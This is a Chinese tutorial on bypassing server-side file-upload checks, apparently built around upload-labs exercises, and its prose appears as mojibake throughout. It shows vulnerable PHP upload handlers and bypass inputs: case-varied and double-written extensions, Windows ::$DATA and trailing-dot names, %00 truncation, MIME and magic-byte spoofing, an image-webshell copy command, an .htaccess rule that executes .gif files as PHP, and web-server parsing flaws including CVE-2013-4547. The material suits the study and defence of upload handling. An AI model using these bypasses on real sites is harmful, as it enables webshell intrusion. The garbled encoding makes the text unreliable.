2.åç«¯_æ‰©å±•åæ£€æµ‹ é’ˆå¯¹æ–‡ä»¶çš„æ‰©å±•ååç¼€è¿›è¡Œæ£€æµ‹ï¼Œä¸»è¦é€šè¿‡é»‘ç™½åå•è¿›è¡Œè¿‡æ»¤æ£€æµ‹ï¼Œè‹¥ä¸ç¬¦åˆè¿‡æ»¤è§„åˆ™åˆ™ä¸å…è®¸ä¸Šä¼ ã€‚ 2.1é»‘åå• é»‘åå•æ£€æµ‹ï¼šä¸€èˆ¬æœ‰ä¸ªä¸“é—¨çš„blacklistæ–‡ä»¶æˆ–åˆ—ä¸¾å‡ºé»‘åå•ï¼Œé‡Œé¢ä¼šåŒ…å«å¸¸è§çš„å±é™©è„šæœ¬æ–‡ä»¶ã€‚ ç»•è¿‡æ–¹æ³• å¤§å°å†™ç»•è¿‡ï¼š æœåŠ¡ç«¯æ²¡æœ‰å°†åç¼€åè½¬æ¢ä¸ºç»Ÿä¸€æ ¼å¼è¿›è¡Œæ¯”å¯¹ï¼Œå¯¼è‡´å¯ä»¥ä¸Šä¼ åç¼€ä¸ºpHpçš„æ–‡ä»¶ï¼Œåˆå› ä¸ºWindowsæ“ä½œç³»ç»Ÿå¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€ä»¥.pHpæ‰”å›è¢«å½“æˆphpæ–‡ä»¶è§£æã€‚ $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']);//å»é™¤å­—ç¬¦ä¸²æ”¶å°¾çš„ç©ºç™½å­—ç¬¦ $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹(è¿™æ˜¯è‡ªå®šä¹‰çš„å‡½æ•°) $file_ext = strrchr($file_name, '.');//æŸ¥æ‰¾'.'åœ¨å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½® $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) { //æ£€æŸ¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸­çš„å†…å®¹æ˜¯å¦åœ¨ç¬¬äºŒä¸ªå‚æ•°(å³æ•°ç»„ä¸­) $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } é€šè¿‡æºä»£ç å¯è§ï¼Œé»‘åå•é‡Œè™½ç„¶çœ‹ä¼¼è¿‡æ»¤å¾—å¾ˆå…¨é¢ï¼Œä½†è¿˜æ˜¯å‡ºç°äº†çº°æ¼â€“æ²¡æœ‰å°†åç¼€åè½¬ä¸ºå°å†™ï¼Œè‹¥åç¼€åä¸º.pHPï¼Œåˆ™å¯ä»¥è¿›è¡Œå¤§å°å†™ç»•è¿‡ï¼ŒæˆåŠŸä¸Šä¼ æ–‡ä»¶ã€‚ $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ ä¿®æ”¹åç¼€åç»•è¿‡ï¼š åå•ä¸­ä¸å…è®¸ä¸Šä¼ .aspï¼Œ.phpï¼Œ.jspï¼Œ.exeåç¼€çš„æ–‡ä»¶ ä½†å¯ä¸Šä¼  â€”asa cer aspx â€”php php3 php4 php5 phtml pht â€”jspx jspf â€”exee å‰ææ˜¯apacheçš„httpd.confä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç  1 | AddType application/x-httpd-php .php .phtml .phps .php5 .pht å½“æˆ‘ä»¬ä¿®æ”¹æ–‡ä»¶ååï¼Œå¯ä»¥å‘ç°æ–‡ä»¶ä¸Šä¼ æˆåŠŸ é‡å†™ï¼ˆåŒå†™ï¼‰ç»•è¿‡ æœåŠ¡ç«¯å°†é»‘åå•çš„åç¼€åæ›¿æ¢ä¸ºç©ºï¼Œä½†åªè¿›è¡Œä¸€æ¬¡ã€‚ä¸Šä¼ .pphphpåç¼€ï¼Œæ›¿æ¢ä¸€ä¸ªphpä¸ºç©ºï¼Œåˆ™åç¼€åå˜ä¸º.phpï¼ŒæˆåŠŸç»•è¿‡ã€‚ $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } åˆ©ç”¨Windowsçš„å‘½åæœºåˆ¶ shell.php. shell.phpç©ºæ ¼ shell.php:1.jpg shell. php::$DATA shell.php:1.jpg åœ¨Windowsä¸­ï¼Œåç¼€ååé¢çš„ç‚¹å’Œç©ºæ ¼éƒ½ä¼šè¢«åˆ é™¤æ‰ 2.2ç™½åå• åŸç†ï¼šç™½åå•æ£€æµ‹:ä¸€èˆ¬æœ‰ä¸ªä¸“é—¨çš„ whitelist æ–‡ä»¶ï¼Œé‡Œé¢ä¼šåŒ…å«çš„æ­£å¸¸æ–‡ä»¶ï¼š Jpg png GIF ç»•è¿‡æ–¹æ³• 3.åç«¯æ£€æµ‹_00æˆªæ–­ ç‚¹å‡»è¿›å…¥ï¼š ã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ã€‘â€”â€”åç«¯æ£€æµ‹_æ–‡ä»¶åæ£€æµ‹00æˆªæ–­ç»•è¿‡ åŸç†ï¼šè™½ç„¶webåº”ç”¨åšäº†æ ¡éªŒï¼Œä½†æ˜¯ç”±äºæ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„ç”¨æˆ·å¯ä»¥æ§åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰‹åŠ¨æ·»åŠ å­—ç¬¦ä¸²æ ‡è¯†ç¬¦0X00çš„æ–¹å¼æ¥å°†åé¢çš„æ‹¼æ¥çš„å†…å®¹è¿›è¡Œæˆªæ–­ï¼Œå¯¼è‡´åé¢çš„å†…å®¹æ— æ•ˆï¼Œè€Œä¸”åé¢çš„å†…å®¹åˆå¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡é»‘ç™½åå•çš„æ£€æµ‹ã€‚ æ€è·¯ï¼šâ€ƒåœ¨Cè¯­è¨€ä¸­ï¼Œç©ºå­—ç¬¦æœ‰ä¸€ä¸ªç‰¹æ®Šå«ä¹‰ï¼Œä»£è¡¨å­—ç¬¦ä¸²çš„æ‹¼æ¥ç»“æŸã€‚ è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯phpè¯­è¨€ï¼Œå±äºé«˜çº§è¯­è¨€ï¼Œåº•å±‚é Cè¯­è¨€æ¥å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç©ºå­—ç¬¦çš„å­—ç¬¦ä¸²æ‹¼æ¥ç»“æŸåŠŸèƒ½åœ¨PHPä¸­ä¹Ÿèƒ½å®ç°ã€‚ä½†æ˜¯æˆ‘ä»¬åœ¨URLä¸­ä¸èƒ½ç›´æ¥ä½¿ç”¨ç©ºï¼Œè¿™æ ·ä¼šé€ æˆæ— æ³•è¯†åˆ«ï¼›æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ASCIIå¯¹ç…§è¡¨ï¼Œå‘ç°ASCIIå¯¹ç…§è¡¨ç¬¬ä¸€ä¸ªå°±ç©ºå­—ç¬¦ï¼Œå®ƒå¯¹åº”çš„16è¿›åˆ¶æ˜¯00ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨16è¿›åˆ¶çš„00æ¥ä»£æ›¿ç©ºå­—ç¬¦ï¼Œè®©å®ƒæˆªæ–­åé¢çš„å†…å®¹ã€‚ ä½¿ç”¨burpsuiteè¿›è¡ŒæŠ“åŒ…ï¼Œå› ä¸ºè¿™é‡Œæ˜¯é€šè¿‡URLè¿›è¡Œä¼ é€’çš„æ–‡ä»¶ä¸Šä¼ åå­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥éœ€è¦å¯¹16è¿›åˆ¶çš„00è¿›è¡ŒURLç¼–ç ï¼Œç¼–ç çš„ç»“æœå°±æ˜¯%00ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼Œå°±å¯ä»¥ç”¨%00æˆªæ–­åé¢çš„å†…å®¹ï¼Œè®©æ‹¼æ¥çš„æ–‡ä»¶åä¸å†è¿›è¡Œç”Ÿæ•ˆï¼š 4.åç«¯æ£€æµ‹_MIMEæ£€æµ‹ï¼š MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚ å¸¸è§MIMEç±»å‹ text/plain ï¼ˆçº¯æ–‡æœ¬ï¼‰ text/html ï¼ˆHTMLæ–‡æ¡£ï¼‰ text/javascript ï¼ˆjsä»£ç ï¼‰ application/xhtml+xml ï¼ˆXHTMLæ–‡æ¡£ï¼‰ image/gif ï¼ˆGIFå›¾åƒï¼‰ image/jpeg ï¼ˆJPEGå›¾åƒï¼‰ image/png ï¼ˆPNGå›¾åƒï¼‰ video/mpeg ï¼ˆMPEGåŠ¨ç”»ï¼‰ application/octet-stream ï¼ˆäºŒè¿›åˆ¶æ•°æ®ï¼‰ application/pdf ï¼ˆPDFæ–‡æ¡£ï¼‰ æ£€æµ‹æ–¹å¼ï¼š åœ¨æ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡ç«¯ä¼šé’ˆå¯¹æˆ‘ä»¬çš„ä¸Šä¼ çš„æ–‡ä»¶ç”Ÿæˆä¸€ä¸ªæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„å…¶ä¸­æœ‰ä¸€é¡¹å°±æ˜¯è¿™ä¸ªæ–‡ä»¶çš„ç±»å‹file_typeï¼›æœåŠ¡ç«¯å¯¹æ–‡ä»¶è¿›è¡Œæ£€æµ‹æ—¶ï¼Œå°±æ˜¯é€šè¿‡æ£€æµ‹è„šæœ¬ä¸­çš„é»‘ç™½åå•å’Œè¿™ä¸ªæ•°ç»„ä¸­çš„file_typeè¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœç¬¦åˆè¦æ±‚å°±å…è®¸ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ã€‚ MIMEç»•è¿‡åŸç†ï¼š éƒ¨åˆ†Webåº”ç”¨ç³»ç»Ÿåˆ¤å®šæ–‡ä»¶ç±»å‹æ˜¯é€šè¿‡content-typeå­—æ®µï¼Œé»‘å®¢å¯ä»¥é€šè¿‡æŠ“åŒ…ï¼Œå°†content-typeå­—æ®µæ”¹ä¸ºå¸¸è§çš„å›¾ç‰‡ç±»å‹ï¼Œå¦‚image/gifï¼Œä»è€Œç»•è¿‡æ ¡éªŒã€‚ 5.åç«¯æ£€æµ‹_æ–‡ä»¶å¤´æ£€æµ‹æ¼æ´ åŸç†ï¼š åœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ï¼ˆåŒ…æ‹¬å›¾ç‰‡ï¼Œè§†é¢‘æˆ–å…¶ä»–çš„éASCIIæ–‡ä»¶ï¼‰çš„å¼€å¤´ï¼ˆåå…­è¿›åˆ¶è¡¨ç¤ºï¼‰å®é™…ä¸Šéƒ½æœ‰ä¸€ç‰‡åŒºåŸŸæ¥æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶çš„å®é™…ç”¨æ³•ï¼Œè¿™å°±æ˜¯æ–‡ä»¶å¤´æ ‡å¿—ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€æ–‡ä»¶ï¼Œæ·»åŠ æœåŠ¡å™¨å…è®¸çš„æ–‡ä»¶å¤´ä»¥ç»•è¿‡æ£€æµ‹ã€‚ å¸¸è§æ–‡ä»¶å¤´ GIFï¼š47 49 46 38 39 61 pngï¼š 89 50 4E 47 0D 0A 1A 0A jpgï¼šFF D8 FF E0 00 10 4A 46 49 46 åœ¨è¿›è¡Œæ–‡ä»¶å¤´ç»•è¿‡æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸Šé¢çš„æ–‡ä»¶å¤´æ·»åŠ åˆ°æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å†…å®¹æœ€å‰é¢ï¼Œè¾¾åˆ°ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹çš„ç›®çš„ã€‚ 6.åç«¯_å†…å®¹æ£€æµ‹å›¾ç‰‡é©¬ç»•è¿‡ åŸç†: ä¸€èˆ¬æ–‡ä»¶å†…å®¹éªŒè¯ä½¿ç”¨getimagesizeå‡½æ•°æ£€æµ‹,ä¼šåˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ–‡ä»¶å›¾ç‰‡,å¦‚æœæ˜¯,åˆ™å…è®¸ä¸Šä¼ ,å¦åˆ™çš„è¯ä¸å…è®¸ä¸Šä¼ ã€‚ å›¾ç‰‡é©¬åˆ¶ä½œ å‡†å¤‡ä¸€å¼ å›¾ç‰‡ï¼Œè¿™é‡Œä¸ºa.pngï¼Œå’Œä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤åˆæˆä¸€ä¸ªå›¾ç‰‡é©¬3.phpï¼š a.phpå†…å®¹ï¼š &lt;?php phpinfo(); ?&gt; å‘½ä»¤: 1 | copy a.png /b + a.php /a 3.png 2 | /b:æŒ‡å®šä»¥äºŒè¿›åˆ¶æ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶ï¼Œç”¨äºå›¾åƒæˆ–è€…å£°éŸ³ç±»æ–‡ä»¶ 3 | /a:æŒ‡å®šä»¥asciiæ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶ç”¨äºtxtç­‰æ–‡æœ¬ç±»æ–‡ä»¶ è¿™ä¸ªå›¾ç‰‡æé”™äº†ï¼Œæœ€ååº”è¯¥æ˜¯png æ³¨ï¼šè¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯ï¼šé€šè¿‡copyå‘½ä»¤ï¼ŒæŠŠa.pngå›¾ç‰‡æ–‡ä»¶ï¼Œä»¥äºŒè¿›åˆ¶æ–‡ä»¶å½¢å¼æ·»åŠ åˆ°a.phpæ–‡ä»¶ä¸­ï¼Œä»¥ASCIIæ–‡æœ¬æ–‡ä»¶å½¢å¼è¾“å‡ºä¸º`3.pngæ–‡ä»¶ã€‚ 7.è§£ææ¼æ´ 7.1 .htaccessæ–‡ä»¶è§£ææ¼æ´ æ¼æ´åˆ©ç”¨å‰æï¼š webå…·ä½“åº”ç”¨æ²¡æœ‰ç¦æ­¢.htaccessæ–‡ä»¶çš„ä¸Šä¼ ï¼ŒåŒæ—¶webæœåŠ¡å™¨æä¾›å•†å…è®¸ç”¨æˆ·ä¸Šä¼ è‡ªå®šä¹‰çš„.htaccessæ–‡ä»¶ã€‚ åŸç†ï¼š .htaccessæ–‡ä»¶(æˆ–è€…\"åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶\") ,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œå³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚ åˆ©ç”¨æ–¹å¼ï¼š ä¸Šä¼ è¦†ç›–.htaccessæ–‡ä»¶ï¼Œé‡å†™è§£æè§„åˆ™ï¼Œå°†ä¸Šä¼ çš„å¸¦æœ‰è„šæœ¬é©¬çš„å›¾ç‰‡ä»¥è„šæœ¬æ–¹å¼è§£æã€‚ .htaccessæ–‡ä»¶å†…å®¹ï¼š .htaccessæ–‡ä»¶è§£æè§„åˆ™çš„å¢åŠ ï¼Œæ˜¯å¯ä»¥æŒ‰ç…§ç»„åˆçš„æ–¹å¼å»åšçš„ï¼Œä¸è¿‡å…·ä½“å¾—è‡ªå·±å¤šæµ‹è¯•ã€‚ &lt;FilesMatch \"evil.gif\"&gt; SetHandler application/x-httpd-php #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚æœåŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡Œ AddHandler php5-script .gif #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚æœåŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡Œ &lt;/FilesMatch&gt; AddType application/x-httpd-php .gif 7.2 Apacheè§£ææ¼æ´ åŸç†ï¼š Apache è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æï¼Œå°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚test.php.a.bçš„â€œ.aâ€å’Œâ€œ.bâ€è¿™ä¸¤ç§åç¼€æ˜¯apacheä¸èƒ½è¯†åˆ«è§£æï¼Œapacheå°±ä¼šæŠŠtest.php.a.bè§£ææˆtest.phpã€‚ 7.3 IIS6.0è§£ææ¼æ´ IIS6.0è§£ææ¼æ´åˆ†ä¸¤ç§ï¼š 1ã€ç›®å½•è§£æï¼š ä»¥xx.aspå‘½åçš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶éƒ½å°†ä¼šè¢«å½“æˆASPæ–‡ä»¶æ‰§è¡Œã€‚ 2ã€æ–‡ä»¶è§£æï¼š xx.asp;.jpg åƒè¿™ç§ç•¸å½¢æ–‡ä»¶ååœ¨;åé¢çš„ç›´æ¥è¢«å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆxx.aspæ–‡ä»¶æ‰§è¡Œã€‚ IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§ .asa .cer .cdxã€‚ 7.4 IIS7.0 | IIS7.5 | Nginxçš„è§£ææ¼æ´ åŸç†ï¼š Nginxæ‹¿åˆ°æ–‡ä»¶è·¯å¾„ï¼ˆæ›´ä¸“ä¸šçš„è¯´æ³•æ˜¯URIï¼‰/test.jpg/test.phpåï¼Œä¸€çœ‹åç¼€æ˜¯.phpï¼Œä¾¿è®¤ä¸ºè¯¥æ–‡ä»¶æ˜¯phpæ–‡ä»¶ï¼Œè½¬äº¤ç»™phpå»å¤„ç†ã€‚phpä¸€çœ‹/test.jpg/test.phpä¸å­˜åœ¨ï¼Œä¾¿åˆ å»æœ€åçš„/test.phpï¼Œåˆçœ‹/test.jpgå­˜åœ¨ï¼Œä¾¿æŠŠ/test.jpgå½“æˆè¦æ‰§è¡Œçš„æ–‡ä»¶äº†ï¼Œåˆå› ä¸ºåç¼€ä¸º.jpgï¼Œphpè®¤ä¸ºè¿™ä¸æ˜¯phpæ–‡ä»¶ï¼Œäºæ˜¯è¿”å›Access deniedã€‚ è¿™å…¶ä¸­æ¶‰åŠåˆ°phpçš„ä¸€ä¸ªé€‰é¡¹ï¼šcgi.fix_pathinfoï¼Œè¯¥å€¼é»˜è®¤ä¸º1ï¼Œè¡¨ç¤ºå¼€å¯ã€‚å¼€å¯è¿™ä¸€é€‰é¡¹PHPå¯ä»¥å¯¹æ–‡ä»¶è·¯å¾„è¿›è¡Œä¿®ç†ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå½“phpé‡åˆ°æ–‡ä»¶è·¯å¾„/1.jpg/2.txt/3.phpæ—¶ï¼Œè‹¥/1.jpg/2.txt/3.phpä¸å­˜åœ¨ï¼Œåˆ™ä¼šå»æ‰æœ€åçš„/3.phpï¼Œç„¶ååˆ¤æ–­/1.jpg/2.txtæ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™æŠŠ/1.jpg/2.txtå½“åšæ–‡ä»¶/1.jpg/2.txt/3.phpï¼Œè‹¥/1.jpg/2.txtä»ä¸å­˜åœ¨ï¼Œåˆ™ç»§ç»­å»æ‰/2.txtï¼Œä»¥æ­¤ç±»æ¨ã€‚ æ¼æ´å½¢å¼ï¼šwww.xxxxx.com/UploadFiles/image/1.jpg/1.php å¦å¤–ä¸¤ç§è§£ææ¼æ´ï¼š www.xxxxx.com/UploadFiles/image/1.jpg%00.php www.xxxxx.com/UploadFiles/image/1.jpg/%20\\0.php 7.5 Nginx æ¼æ´ PHP+nginxé»˜è®¤æ˜¯ä»¥cgiçš„æ–¹å¼å»è¿è¡Œï¼Œå½“ç”¨æˆ·é…ç½®ä¸å½“ï¼Œä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶è¢«å½“ä½œphpå»è§£æã€‚ åˆ©ç”¨æ¡ä»¶: ä»¥FastCGlè¿è¡Œ cgi.fix_pathinfo=1(å…¨ç‰ˆæœ¬PHPé»˜è®¤ä¸ºå¼€å¯) ä¾‹å¦‚å¦‚æœæ»¡è¶³ä¸Šè¿°æ¡ä»¶ï¼Œå½“ä½ è®¿é—®url/shell.jpg/shell.phpæ—¶ï¼Œshell.jpgä¼šè¢«å½“ä½œphpå»æ‰§è¡Œã€‚ 7.6 Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´(CVE-2013-4547) å½±å“ç‰ˆæœ¬:Nginx 0.8.41 ~ 1.4.3/1.5.0 ~ 1.5.7 åˆ©ç”¨è¿‡ç¨‹: ä¸Šä¼ ä¸€ä¸ªshell.jpgæ–‡ä»¶ï¼Œæ³¨æ„æœ€åä¸ºç©ºæ ¼ è®¿é—®url/shell.jpg[Ox20][Ox00].php (ä¸¤ä¸ªä¸­æ‹¬å·ä¸­çš„æ•°å­—æ˜¯ç”¨Burpåœ¨Hexç•Œé¢ä¸­æ›´æ”¹) æ¼æ´å¤ç°å‚è€ƒé“¾æ¥ 8.äºŒæ¬¡æ¸²æŸ“æ¼æ´ åŸç†ï¼š åœ¨æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶åï¼Œç½‘ç«™ä¼šå¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡å¤„ç†ï¼ˆæ ¼å¼ã€å°ºå¯¸è¦æ±‚ç­‰ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šæŠŠé‡Œé¢çš„å†…å®¹è¿›è¡Œæ›¿æ¢æ›´æ–°ï¼Œå¤„ç†å®Œæˆåï¼Œæ ¹æ®æˆ‘ä»¬åŸæœ‰çš„å›¾ç‰‡ç”Ÿæˆä¸€ä¸ªæ–°çš„å›¾ç‰‡å¹¶æ”¾åˆ°ç½‘ç«™å¯¹åº”çš„æ ‡ç­¾è¿›è¡Œæ˜¾ç¤ºã€‚ ç»•è¿‡ï¼š 1ã€é…åˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼š å°†ä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°ç½‘ç«™äºŒæ¬¡å¤„ç†åçš„å›¾ç‰‡ä¸­ï¼Œä¹Ÿå°±æ˜¯æŠŠä¸€å¥è¯æ’å…¥å›¾ç‰‡åœ¨äºŒæ¬¡æ¸²æŸ“åä¼šä¿ç•™çš„ é‚£éƒ¨åˆ†æ•°æ®é‡Œï¼Œç¡®ä¿ä¸ä¼šåœ¨äºŒæ¬¡å¤„ç†æ—¶åˆ é™¤æ‰ã€‚è¿™æ ·äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ä¸­å°±å­˜åœ¨äº†ä¸€å¥è¯ï¼Œåœ¨é…åˆæ–‡ä»¶åŒ…å«æ¼æ´è·å–webshellã€‚ 2ã€å¯ä»¥é…åˆæ¡ä»¶ç«äº‰ï¼š è¿™é‡ŒäºŒæ¬¡æ¸²æŸ“çš„é€»è¾‘å­˜åœ¨æ¼æ´ï¼Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ ï¼Œä¹‹åå†åˆ¤æ–­ï¼Œç¬¦åˆå°±ä¿å­˜ï¼Œä¸ç¬¦åˆåˆ é™¤ï¼Œå¯åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥è¿›è¡Œçˆ†ç ´ä¸Šä¼  å¦‚ä½•åˆ¤æ–­å›¾ç‰‡æ˜¯å¦è¿›è¡Œäº†äºŒæ¬¡å¤„ç†ï¼Ÿ å¯¹æ¯”è¦ä¸Šä¼ å›¾ç‰‡ä¸ä¸Šä¼ åçš„å›¾ç‰‡å¤§å°ï¼Œä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€å›¾ç‰‡æŸ¥çœ‹ä¸Šä¼ åä¿ç•™äº†å“ªäº›æ•°æ®ï¼ŒæŸ¥çœ‹é‚£äº›æ•°æ®è¢«æ”¹å˜ã€‚ 9.æ¡ä»¶ç«äº‰ $is_upload = false; $msg = null; //åˆ¤æ–­æ–‡ä»¶ä¸Šä¼ æ“ä½œ if(isset($_POST['submit'])){ //åˆ¤æ–­æ˜¯å¦æ¥æ”¶åˆ°è¿™ä¸ªæ–‡ä»¶ $ext_arr = array('jpg','png','gif'); //å£°æ˜ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„é‡Œé¢æœ‰3æ¡æ•°æ®ï¼Œä¸ºï¼š'jpg','png','gif' $file_name = $_FILES['upload_file']['name']; //è·å–å›¾ç‰‡çš„åå­— $temp_file = $_FILES['upload_file']['tmp_name']; //è·å–å›¾ç‰‡çš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ $file_ext = substr($file_name,strrpos($file_name,\".\")+1); //é€šè¿‡æ–‡ä»¶åæˆªå–å›¾ç‰‡åç¼€ $upload_file = UPLOAD_PATH . '/' . $file_name; //æ„é€ å›¾ç‰‡çš„ä¸Šä¼ è·¯å¾„ï¼Œè¿™é‡Œæš‚æ—¶é‡æ„å›¾ç‰‡åç¼€åã€‚ if(move_uploaded_file($temp_file, $upload_file)){ //è¿™é‡Œå¯¹æ–‡ä»¶è¿›è¡Œäº†è½¬å­˜ if(in_array($file_ext,$ext_arr)){ //è¿™é‡Œä½¿ç”¨æˆªå–åˆ°çš„åç¼€åå’Œæ•°ç»„é‡Œé¢çš„åç¼€åè¿›è¡Œå¯¹æ¯” $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; //å¦‚æœå­˜åœ¨ï¼Œå°±å¯¹æ–‡ä»¶åè¿›è¡Œé‡æ„ rename($upload_file, $img_path); //æŠŠä¸Šé¢çš„æ–‡ä»¶åè¿›è¡Œé‡å‘½å $is_upload = true; }else{ $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; 